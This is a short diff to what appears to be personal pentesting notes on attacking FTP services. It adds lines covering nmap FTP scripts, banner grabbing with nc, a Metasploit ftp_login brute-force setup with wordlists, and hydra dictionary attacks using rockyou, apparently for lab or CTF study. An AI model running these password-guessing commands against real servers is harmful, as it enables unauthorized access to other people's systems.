@@ -18,10 +18,14 @@ ftp> get <name_file>
 ```bash
 # test all ftp script 
 nmap -p21 --script="ftp-*" $target
+ls /usr/share/nmap/scripts/ftp-*.nse
 # get banner
 nc -nv $target 21
 # metasploit scan
 search auxiliary/scanner/ftp/
+> use scanner/ftp/ftp_login
+> set user_file /usr/share/metasploit-framework/data/wordlists/common_roots.txt
+> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 # dictionary attack
 hydra -l usuario -P $rockyou $target ftp
 hydra -l fiona -P $rockyou ftp://$target -u -t 1
